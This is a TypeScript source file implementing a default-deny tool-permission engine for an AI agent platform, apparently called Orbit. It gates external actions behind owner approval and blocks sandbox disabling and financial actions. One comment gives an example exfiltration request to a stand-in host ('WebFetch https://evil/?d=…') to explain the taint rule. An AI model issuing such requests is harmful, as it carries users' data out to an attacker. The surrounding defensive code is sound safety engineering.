import type { Tier, ToolPermissionRequest } from '@orbit/core';
import type { ApprovalQueue } from './approvals';
import { type FileAccessContext, LOCAL_WRITE_TOOLS, READ_TOOLS, checkFileAccess } from './baseline';
import type { RuleStore } from './rules';
import { type ToolTierOverride, classifyTool } from './tiers';

export interface PolicyContext {
  botId: string;
  runId: string;
  files: FileAccessContext;
  /** Shell commands are sandboxed with no network (see @orbit/sandbox). */
  shellContained: boolean;
  /** Untrusted content has entered this Run. */
  tainted: boolean;
  overrides?: readonly ToolTierOverride[];
}

export type PolicyOutcome =
  | {
      decision: 'allow';
      tier: Tier;
      reason: string;
      ruleId: string | null;
      approvalId: string | null;
      updatedInput: Record<string, unknown> | null;
      /** Set when the tool returns third-party content: the Run becomes tainted. */
      untrustedSource: string | null;
    }
  | { decision: 'deny'; tier: Tier | null; reason: string; ruleId: string | null }
  | { decision: 'ask'; tier: Tier; reason: string };

/** Built-in tools that send Bot-chosen data to arbitrary hosts. */
const EGRESS_TOOLS = new Set(['WebFetch', 'WebSearch']);

const HANDBACK =
  'Financial or irreversible action: Orbit never executes these. Prepare the details (a draft, a summary or a checklist) and hand it to your owner.';

/**
 * Tiered, default-deny policy (PLAN.md §2.6):
 *   unknown tool                       → deny
 *   file path outside the workspace    → deny
 *   FINANCIAL                          → deny (hand back to the human)
 *   one-shot grant from an approval    → allow (exactly this input, once)
 *   user-authored deny rule            → deny
 *   READ / WRITE_LOCAL                 → allow
 *   EXTERNAL + allow rule, not tainted → allow
 *   EXTERNAL otherwise                 → ask (approval queue)
 * Tainted Runs can never auto-allow EXTERNAL actions, whatever the rules say.
 */
export class PolicyEngine {
  constructor(
    private readonly approvals: ApprovalQueue,
    private readonly rules: RuleStore,
  ) {}

  evaluate(req: ToolPermissionRequest, ctx: PolicyContext): PolicyOutcome {
    const { toolName, input } = req;
    const cls = classifyTool(toolName, {
      shellContained: ctx.shellContained,
      ...(ctx.overrides ? { overrides: ctx.overrides } : {}),
    });
    if (!cls) {
      return {
        decision: 'deny',
        tier: null,
        ruleId: null,
        reason: `${toolName || 'Unnamed tool'} is unknown to Orbit (default deny)`,
      };
    }
    const { tier } = cls;

    if (READ_TOOLS.has(toolName) || LOCAL_WRITE_TOOLS.has(toolName)) {
      const denied = checkFileAccess(toolName, input, ctx.files);
      if (denied) return { decision: 'deny', tier, ruleId: null, reason: denied };
    }

    if (tier === 'FINANCIAL') return { decision: 'deny', tier, ruleId: null, reason: HANDBACK };

    const grant = this.approvals.consumeGrant(ctx.runId, ctx.botId, toolName, input);
    if (grant) {
      return {
        decision: 'allow',
        tier,
        ruleId: null,
        approvalId: grant.approvalId,
        updatedInput: grant.updatedInput,
        untrustedSource: cls.untrustedSource,
        reason: grant.updatedInput ? 'Approved by owner (edited)' : 'Approved by owner',
      };
    }

    const matching = this.rules.matching(ctx.botId, toolName, input);
    const denyRule = matching.find((r) => r.effect === 'deny');
    if (denyRule) {
      return {
        decision: 'deny',
        tier,
        ruleId: denyRule.id,
        reason: denyRule.reason ?? 'Denied by a standing rule',
      };
    }

    const allow = (reason: string, ruleId: string | null = null): PolicyOutcome => ({
      decision: 'allow',
      tier,
      reason,
      ruleId,
      approvalId: null,
      updatedInput: null,
      untrustedSource: cls.untrustedSource,
    });

    // In a tainted Run, tools that reach the internet with Bot-chosen arguments
    // could carry data out (WebFetch https://evil/?d=…): ask instead (ADR-009).
    if (ctx.tainted && (EGRESS_TOOLS.has(toolName) || cls.egress === true)) {
      return {
        decision: 'ask',
        tier: 'EXTERNAL',
        reason:
          'Untrusted content entered this Run, so web requests need your approval (they could carry data out)',
      };
    }
    // The engine's own escape hatch from its sandbox is never allowed.
    if (input.dangerouslyDisableSandbox === true) {
      return {
        decision: 'deny',
        tier,
        ruleId: null,
        reason: 'Disabling the sandbox is not allowed',
      };
    }

    if (tier === 'READ') return allow('Read-only');
    if (tier === 'WRITE_LOCAL') {
      return allow(
        toolName.startsWith('mcp__')
          ? 'Prepares a draft (nothing leaves the sandbox)'
          : 'Local change inside the sandbox',
      );
    }

    // EXTERNAL
    const allowRule = matching.find((r) => r.effect === 'allow');
    if (allowRule && !ctx.tainted) return allow('Allowed by a standing rule', allowRule.id);
    return {
      decision: 'ask',
      tier,
      reason: ctx.tainted
        ? 'Untrusted content entered this Run, so external actions need your approval'
        : 'External action: needs your approval',
    };
  }
}
